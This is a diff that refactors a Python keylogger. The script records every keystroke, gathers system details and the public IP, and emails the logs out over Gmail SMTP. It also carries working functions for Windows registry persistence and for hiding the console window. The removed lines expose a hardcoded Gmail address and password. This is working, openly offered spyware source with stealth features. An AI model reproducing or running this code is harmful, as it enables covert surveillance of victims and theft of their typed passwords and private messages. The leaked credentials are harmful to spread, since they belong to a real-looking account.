@@ -8,234 +8,275 @@
 ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
 ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
 """
-
-# --------------------------------------------------------------------------Libraries
+import os
+import sys
+import platform
+import socket
+import urllib.request
+import logging
+import smtplib
+from datetime import datetime
+from pynput.keyboard import Key, Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-import smtplib
+from logging.handlers import RotatingFileHandler
 
-import socket
-import platform
+# ------------------------------------------------------------------------------
+# Optional Windows-Specific Imports
+if platform.system().lower() == "windows":
+    try:
+        from winreg import (
+            OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+        )
+        import win32console
+        import win32gui
+    except ImportError:
+        # These libraries won't exist on non-Windows platforms
+        pass
 
-from pynput.keyboard import Key, Listener
+# ------------------------------------------------------------------------------
+# Constants / Configuration
+SYSINFO_FILE = "sysinfo.txt"
+KEYLOG_FILE = "log.txt"
+LOG_INTERVAL = 60  # seconds between log flush or checks, if needed
+KEYS_BEFORE_WRITE = 20 # log keys after these many keypresses
 
-import os
-from datetime import datetime
-import os.path
+# ------------------------------------------------------------------------------
+MAIL_ADDRESS = "YOUR_EMAIL@gmail.com"
+MAIL_PASSWORD = "YOUR_PASSWORD"
 
-import urllib.request
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
 
-from winreg import *
-import sys
+# ------------------------------------------------------------------------------
+# Setup Logging
+LOG_FILENAME = "internal_log.txt"  # Internal, not the keylog.
+# Configure a rotating file handler to limit log file size.
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[
+        RotatingFileHandler(
+            LOG_FILENAME, maxBytes=1000000, backupCount=3, encoding="utf-8"
+        ),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
 
-import time
+logger = logging.getLogger(__name__)
 
-# -------------------------------------------------------------------------Add file to startup registry
-# def addStartup():
-#     fp = os.path.dirname(os.path.realpath(__file__))
-#     file_name = sys.argv[0].split("\\")[-1]
-#     new_file_path = fp + "\\" + file_name
-#     keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
-#     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-#     SetValueEx(key2change, "Im not a keylogger", 0, REG_SZ, new_file_path)
+# ------------------------------------------------------------------------------
+# Optional: Add script to Windows Startup
+def add_to_windows_startup(program_name: str = "MyKeylogger"):
+    """
+    Adds this script to Windows Startup (Current User).
+    This is Windows-specific. Only call this if on Windows.
+    """
+    if platform.system().lower() != "windows":
+        logger.warning("add_to_windows_startup called on non-Windows system.")
+        return
 
+    try:
+        script_path = os.path.realpath(sys.argv[0])
+        with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS) as key:
+            SetValueEx(key, program_name, 0, REG_SZ, script_path)
+        logger.info("Successfully added to Windows startup.")
+    except Exception as e:
+        logger.error(f"Failed to add to Windows startup: {e}")
 
-# def hideconsole():
-#     import win32console
-#     import win32gui
+# ------------------------------------------------------------------------------
+# Optional: Hide Console on Windows
+def hide_console():
+    """
+    Hides the console window on Windows OS.
+    """
+    if platform.system().lower() != "windows":
+        logger.warning("hide_console called on non-Windows system.")
+        return
 
-#     win = win32console.GetConsoleWindow()
-#     win32gui.ShowWindow(win, 0)
+    try:
+        console_window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(console_window, 0)
+        logger.info("Console window hidden.")
+    except Exception as e:
+        logger.error(f"Failed to hide console window: {e}")
 
+# ------------------------------------------------------------------------------
+def send_email(subject: str, filename: str):
+    """
+    Sends an email with the specified file as an attachment.
+    Uses MAIL_ADDRESS and MAIL_PASSWORD environment variables.
+    """
+    if not MAIL_ADDRESS or not MAIL_PASSWORD:
+        logger.error("Email credentials not found. Set environment variables LOG_MAIL_ADDRESS and LOG_MAIL_PASSWORD.")
+        return
 
-# addStartup()
-# hideconsole()
-
-
-# ------------------------------------------------------------------------Sending Mail
-
-
-def sendmail(subject, filename):
-    mailaddress = "viditsirohi@gmail.com"
+    if not os.path.exists(filename):
+        logger.warning(f"File {filename} does not exist. Email not sent.")
+        return
 
     msg = MIMEMultipart()
-    msg["From"] = mailaddress
-    msg["To"] = mailaddress
+    msg["From"] = MAIL_ADDRESS
+    msg["To"] = MAIL_ADDRESS
     msg["Subject"] = subject
 
-    attachment = open(
-        os.path.dirname(os.path.realpath(__file__)) + "\\" + filename, "rb"
-    )
-
-    base_inst = MIMEBase("application", "octet-stream")
-    base_inst.set_payload((attachment).read())
-
-    encoders.encode_base64(base_inst)
-    base_inst.add_header("Content-Disposition", "attachment; filename= %s" % filename)
-
-    msg.attach(base_inst)
-
-    s = smtplib.SMTP("smtp.gmail.com", 587)
-    s.starttls()
-    s.login(mailaddress, "Gmail@14!")
-
-    text = msg.as_string()
-
-    s.sendmail(mailaddress, mailaddress, text)
-
-    s.quit()
-
-
-# -------------------------------------------------------------------------Sys info
-
-try:
-    f = open("sysinfo.txt", "a")
-    f.close
-except:
-    f = open("sysinfo.txt", "w")
-    f.close
-
-
-def sys_info():
-    with open("sysinfo.txt", "a") as f:
-        hostname = socket.gethostname()
-        IPaddr = socket.gethostbyname(hostname)
-        try:
-            ext_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
-            f.write("public IP: " + ext_ip + "\n")
-        except Exception:
-            f.write("couldn't get ext IP \n")
-
-        f.write("processor: " + (platform.processor()) + "\n")
-        f.write(
-            "System: " + platform.system() + "\nVersion: " + platform.version() + "\n"
-        )
-        f.write("Machine: " + platform.machine() + "\n")
-        f.write("Hostname: " + hostname + "\n")
-        f.write("internal IP: " + IPaddr + "\n")
-
-
-sys_info()
-sendmail("System information", "sysinfo.txt")
-
-
-# --------------------------------------------------------------------------Key Logger
-starttime = time.time()
-interval = 60
-count = 0
-keys = []
-
-
-def Keylogger():
     try:
-        f = open("log.txt", "a")
-        f.close
-    except:
-        f = open("log.txt", "w")
-        f.close
+        with open(filename, "rb") as attachment:
+            base_inst = MIMEBase("application", "octet-stream")
+            base_inst.set_payload(attachment.read())
+        encoders.encode_base64(base_inst)
+        base_inst.add_header(
+            "Content-Disposition",
+            f'attachment; filename="{os.path.basename(filename)}"'
+        )
+        msg.attach(base_inst)
 
-    with open("log.txt", "a") as f:
-        f.write("{0} \n\n".format(datetime.now()))
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(MAIL_ADDRESS, MAIL_PASSWORD)
+            server.sendmail(MAIL_ADDRESS, MAIL_ADDRESS, msg.as_string())
 
-    def on_press(key):
-        global keys, count
-        keys.append(key)
-        count += 1
+        logger.info(f"Email sent with attachment: {filename}")
 
-        if count >= 20:
-            count = 0
-            write_file(keys)
-            keys = []
+    except Exception as e:
+        logger.error(f"Failed to send email: {e}")
 
-    def write_file(keys):
-        with open("log.txt", "a") as f:
+# ------------------------------------------------------------------------------
+def collect_system_info(filename: str = SYSINFO_FILE):
+    """
+    Gathers basic system information (hostname, internal/external IP, OS, etc.)
+    and writes it to `filename`.
+    """
+    try:
+        with open(filename, "a", encoding="utf-8") as f:
+            hostname = socket.gethostname()
+            ip_addr = socket.gethostbyname(hostname)
+
+            # Attempt to get external/public IP
+            try:
+                external_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
+            except Exception:
+                external_ip = "N/A"
+
+            f.write("----- System Info -----\n")
+            f.write(f"Timestamp: {datetime.now()}\n")
+            f.write(f"Public IP: {external_ip}\n")
+            f.write(f"Processor: {platform.processor()}\n")
+            f.write(f"System: {platform.system()} | Version: {platform.version()}\n")
+            f.write(f"Machine: {platform.machine()}\n")
+            f.write(f"Hostname: {hostname}\n")
+            f.write(f"Internal IP: {ip_addr}\n")
+            f.write("-----------------------\n\n")
+
+        logger.info(f"System information collected in {filename}")
+    except Exception as e:
+        logger.error(f"Error collecting system info: {e}")
+
+# ------------------------------------------------------------------------------
+def write_keys_to_file(filename: str, keys: list):
+    """
+    Converts a list of pynput Key objects (and characters) into readable strings,
+    and appends them to `filename`.
+    """
+    try:
+        with open(filename, "a", encoding="utf-8") as f:
             for key in keys:
                 k = str(key).replace("'", "")
+
+                # Common transformations for readability
                 if k == "Key.space":
                     f.write(" ")
                 elif k == "Key.backspace":
-                    f.write("<bksp>")
-                elif k == "key.enter":
+                    f.write("<BKSP>")
+                elif k == "Key.enter":
                     f.write("\n")
-                elif k == "Key.left":
-                    f.write("<lftarw>")
-                elif k == "Key.right":
-                    f.write("<rtarw>")
-                elif k == "Key.down":
-                    f.write("<dwnarw>")
-                elif k == "Key.up":
-                    f.write("<uparw>")
-                elif k == "Key.ctrl_l":
-                    f.write("<ctrl_l>")
-                elif k == "Key.ctrl_r":
-                    f.write("<ctrl_r>")
                 elif k == "Key.tab":
-                    f.write("<tab>")
-                elif k == "Key.caps_lock":
-                    f.write("<caps_lock>")
+                    f.write("<TAB>")
                 elif k == "Key.shift":
-                    f.write("<shift>")
-                elif k == "Key.shift_r":
-                    f.write("<shift_r>")
-                elif k == "Key.ctrl_l":
-                    f.write("<ctrl_l>")
-                elif k == "Key.ctrl_r":
-                    f.write("<ctrl_r`~>")
-                elif k == "Key.f1":
-                    f.write("<F1>")
-                elif k == "Key.f2":
-                    f.write("<F2>")
-                elif k == "Key.f3":
-                    f.write("<F3>")
-                elif k == "Key.f4":
-                    f.write("<F4>")
-                elif k == "Key.f5":
-                    f.write("<F5>")
-                elif k == "Key.f6":
-                    f.write("<F6>")
-                elif k == "Key.f7":
-                    f.write("<F7>")
-                elif k == "Key.f8":
-                    f.write("<F8>")
-                elif k == "Key.f9":
-                    f.write("<F9>")
-                elif k == "Key.f10":
-                    f.write("<F10>")
-                elif k == "Key.f11":
-                    f.write("<F11>")
-                elif k == "Key.f12":
-                    f.write("<F12>")
-                elif k == "Key.print_screen":
-                    f.write("<prtsc>")
-                elif k == "Key.scroll_lock":
-                    f.write("<scrlk>")
-                elif k == "Key.pause":
-                    f.write("<pause>")
-                elif k == "Key.home":
-                    f.write("<home>")
-                elif k == "Key.end":
-                    f.write("<end>")
-                elif k == "Key.delete":
-                    f.write("<delete>")
-                elif k == "Key.insert":
-                    f.write("<insert>")
-                elif k == "Key.page_up":
-                    f.write("<page_up>")
-                elif k == "Key.page_down":
-                    f.write("<page_down>")
+                    f.write("<SHIFT>")
+                elif k == "Key.ctrl_l" or k == "Key.ctrl_r":
+                    f.write("<CTRL>")
+                elif k == "Key.esc":
+                    f.write("<ESC>")
+                elif k.startswith("Key."):
+                    # For other special keys like Key.f1, Key.up, etc.
+                    # For example: Key.f1 -> <F1>
+                    f.write(f"<{k.replace('Key.', '').upper()}>")
                 else:
-                    f.write(str(k))
+                    f.write(k)
+    except Exception as e:
+        logger.error(f"Error writing keys to file: {e}")
+
+# ------------------------------------------------------------------------------
+def keylogger(log_filename: str = KEYLOG_FILE):
+    """
+    Listens for keystrokes, writes them to `log_filename` in batches,
+    and can optionally send the log via email upon exit.
+    """
+    # Ensure file exists, or create it if not
+    open(log_filename, "a").close()
+
+    key_buffer = []
+
+    # Add a timestamp at the beginning of each keylogger session
+    with open(log_filename, "a", encoding="utf-8") as f:
+        f.write(f"\n----- Keylogging session started at {datetime.now()} -----\n")
+
+    def on_press(key):
+        nonlocal key_buffer
+        key_buffer.append(key)
+
+        # Write to file after collecting a certain number of keys
+        if len(key_buffer) >= KEYS_BEFORE_WRITE:
+            write_keys_to_file(log_filename, key_buffer)
+            key_buffer = []
 
     def on_release(key):
+        # Stop keylogger when ESC is pressed
         if key == Key.esc:
-            with open("log.txt", "a") as f:
-                f.write("\n\n")
-            sendmail("Keylogger", "log.txt")
+            # Write any remaining keys in the buffer
+            if key_buffer:
+                write_keys_to_file(log_filename, key_buffer)
+
+            # Add a final timestamp
+            with open(log_filename, "a", encoding="utf-8") as f:
+                f.write(f"\n----- Keylogging session ended at {datetime.now()} -----\n\n")
+
+            # Optionally send the log file at the end
+            send_email("Keylogger Log", log_filename)
+
+            logger.info("Keylogger stopped by user (ESC).")
             return False
 
+    # Start listening
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
+# ------------------------------------------------------------------------------
+def main():
+    """
+    Main function that orchestrates the script:
+      1) Optionally add to startup on Windows.
+      2) Optionally hide the console on Windows.
+      3) Collect and email system info.
+      4) Start the keylogger.
+    """
+    logger.info("Script started.")
 
-Keylogger()
+    # Uncomment these if you want Windows stealth & persistence:
+    # add_to_windows_startup("MyKeylogger")
+    # hide_console()
+
+    # 1) Collect system info and send it
+    collect_system_info(SYSINFO_FILE)
+    send_email("System information", SYSINFO_FILE)
+
+    # 2) Start keylogger
+    keylogger(KEYLOG_FILE)
+
+    logger.info("Script finished.")
+
+# ------------------------------------------------------------------------------
+if __name__ == "__main__":
+    main()
